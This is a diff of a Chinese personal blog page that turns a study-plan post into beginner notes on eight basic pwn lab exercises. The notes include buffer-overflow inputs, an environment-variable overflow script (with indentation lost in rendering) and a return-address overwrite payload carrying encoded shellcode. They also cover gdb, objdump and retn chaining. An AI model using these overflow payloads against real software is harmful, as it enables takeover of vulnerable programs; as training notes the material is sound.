@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="寒假计划"/>
+        <meta property="og:title" content="8道Pwn基础练习所得"/>
     
 
     <!--Open Graph Description-->
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>寒假计划 - Mr_white</title>
+    <title>8道Pwn基础练习所得 - Mr_white</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -136,12 +136,12 @@
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/2017/01/16/寒假计划/">
-                寒假计划
+            <a href="/2017/02/09/8道Pwn基础练习所得/">
+                8道Pwn基础练习所得
             </a>
         </h1>
         <div class="post-info">
-            <span class="date">2017-01-16</span>
+            <span class="date">2017-02-09</span>
             <a href="#disqus_thread" class="comments">留言</a>
             
         </div>
@@ -153,11 +153,82 @@
         
 
         <!-- Post Content -->
-        <p>寒假到了，一个关键的时间。定下一个学习计划来提升。<br><a id="more"></a></p>
-<h3 id="1、自主练习学习python"><a href="#1、自主练习学习python" class="headerlink" title="1、自主练习学习python"></a>1、自主练习学习python</h3><p>参考书籍以及网上的知识自己进行python程序的练习，把网盘资料里的80个程序进行编辑练习。</p>
-<h3 id="2、逆向破解练习"><a href="#2、逆向破解练习" class="headerlink" title="2、逆向破解练习"></a>2、逆向破解练习</h3><p>自己找10道对于算法无关的逆向题目进行破解，每题搞懂，将所得写到writeup上传博客。</p>
-<h3 id="3、一步一步学rop-x86篇"><a href="#3、一步一步学rop-x86篇" class="headerlink" title="3、一步一步学rop x86篇"></a>3、一步一步学rop x86篇</h3><p>对于这篇文章自己进行学习，并写总结上传博客。</p>
-<h3 id="4、linux系统"><a href="#4、linux系统" class="headerlink" title="4、linux系统"></a>4、linux系统</h3><p>了解linux下的保护机制，一些常见漏洞的了解。</p>
+        <p>刚开始做pwn的题目，从基础开始咯，所以在合天上先总结一些学到的指令。（基础gdb就不多说了）<br>{!:在数据填充的时候不可以用换行符号进行填充}</p>
+<a id="more"></a>
+<h3 id="一、Pwn基础练习1"><a href="#一、Pwn基础练习1" class="headerlink" title="一、Pwn基础练习1"></a>一、Pwn基础练习1</h3><p>查询pwn程序的c语言源代码</p>
+<blockquote>
+<p>cat  pwn.c</p>
+</blockquote>
+<p>直接将64个A和一个B通过管道输入到程序中</p>
+<blockquote>
+<p>python -c “print ‘A’*64+’B’” | ./pwn</p>
+</blockquote>
+<h3 id="二、Pwn基础练习2"><a href="#二、Pwn基础练习2" class="headerlink" title="二、Pwn基础练习2"></a>二、Pwn基础练习2</h3><p> Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。<br>将AAA BBB CCC传给指定的test指令然后进行输出。<br>（用户函数中没有获取函数值语句的程序当中）</p>
+<blockquote>
+<p>python -c “print ‘AAA BBB CCC’” | xargs ./test</p>
+</blockquote>
+<p>以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）</p>
+<blockquote>
+<p>x /4xb $esp+0x5C  </p>
+</blockquote>
+<h3 id="三、Pwn基础练习3"><a href="#三、Pwn基础练习3" class="headerlink" title="三、Pwn基础练习3"></a>三、Pwn基础练习3</h3><p><strong>Python基础知识</strong></p>
+<p>   Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。</p>
+<p>   运行脚本就可以把这题pwn成功</p>
+<pre><code>import os
+
+defpwn():
+os.putenv(&quot;HEETIAN&quot;,&quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;)
+os.system(&quot;./pwn3&quot;)
+if __name__ ==&quot;__main__&quot;:
+pwn()
+</code></pre><p>在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。）</p>
+<blockquote>
+<p>export testenv=”Hello_World”</p>
+</blockquote>
+<p>Linux Shell中，可以使用$()或者两个反引号（<code>）来包裹一条shell命令，并返回shell命令的执行结果。
+比如执行export testenv2=</code>python -c “print ‘A’*20”`命令后，再执行./env可以看到有一个名为testenv2的环境变量，其值为20个A。</p>
+<blockquote>
+<p>export testenv2=<code>python -c &quot;print &#39;A&#39;*20&quot;</code></p>
+</blockquote>
+<h3 id="四、Pwn基础练习4"><a href="#四、Pwn基础练习4" class="headerlink" title="四、Pwn基础练习4"></a>四、Pwn基础练习4</h3><p><strong>一、objdump使用</strong></p>
+<p>   使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。</p>
+<p>使用下面这条指令可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作</p>
+<blockquote>
+<p>objdump -d pwn4</p>
+</blockquote>
+<h3 id="五、Pwn基础练习5"><a href="#五、Pwn基础练习5" class="headerlink" title="五、Pwn基础练习5"></a>五、Pwn基础练习5</h3><p>1、C语言函数调用约定通过压栈实现参数传递，且参数压栈顺序为从右往左<br>2、查询esp寄存器中的值 </p>
+<blockquote>
+<p>i r $esp</p>
+</blockquote>
+<h3 id="六、Pwn基础练习6"><a href="#六、Pwn基础练习6" class="headerlink" title="六、Pwn基础练习6"></a>六、Pwn基础练习6</h3><p>二、Shellcode<br>   Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。<br>   Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为：</p>
+<p>   <a href="http://shell-storm.org/shellcode/" target="_blank" rel="external">http://shell-storm.org/shellcode/</a></p>
+<p>   <a href="http://www.exploit-db.com/shellcode/" target="_blank" rel="external">http://www.exploit-db.com/shellcode/</a></p>
+<p>具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）<br>将pwn6.py 脚本写到test文件里面  然后把test文本拖到pwn6程序里面运行。</p>
+<pre><code>python pwn6.py &gt; test
+./pwn6 &lt; test
+</code></pre><p>shellcod的python脚本</p>
+<pre><code>shellcode = (&quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe&quot; +
+&quot;\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff&quot; +
+&quot;\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69&quot; +
+&quot;\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;)
+
+print &apos;A&apos;*76 + &apos;\xd0\xd6\xff\xff&apos; + shellcode
+</code></pre><h3 id="七、Pwn基础练习7"><a href="#七、Pwn基础练习7" class="headerlink" title="七、Pwn基础练习7"></a>七、Pwn基础练习7</h3><p><strong>一、__builtin_return_address函数</strong></p>
+<p>  <strong>builtin_return_address函数接收一个参数，可以是0,1,2等。</strong>builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址.</p>
+<p><strong>二、理解多层跳转</strong></p>
+<p>retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。</p>
+<p>如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。</p>
+<p><strong>三、函数作用</strong></p>
+<p><strong>fflush()</strong>用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：<br>    int fflush(FILE* stream);</p>
+<p>【参数】stream为文件指针。</p>
+<p>【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。</p>
+<p><strong>fflush()</strong>也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。</p>
+<p><strong>stdin</strong> 是 standard input 的缩写，即标准输入，一般是指键盘；标准输入缓冲区即是用来暂存从键盘输入的内容的缓冲区。</p>
+<p><strong>stdout</strong> 是 standard output 的缩写，即标准输出，一般是指显示器；标准输出缓冲区即是用来暂存将要显示的内容的缓冲区。</p>
+<h3 id="八、Pwn基础练习8"><a href="#八、Pwn基础练习8" class="headerlink" title="八、Pwn基础练习8"></a>八、Pwn基础练习8</h3><p><strong>二、strdup函数</strong></p>
+<p>   strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。</p>
+<p><strong>三、grep命令</strong></p>
+<p>   当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。<br>   我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。<br>   对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，<em>是正则表达式里面的通配符，如果要查找</em>，需要使用反斜杠进行转移，即*。</p>
 
     </div>
 
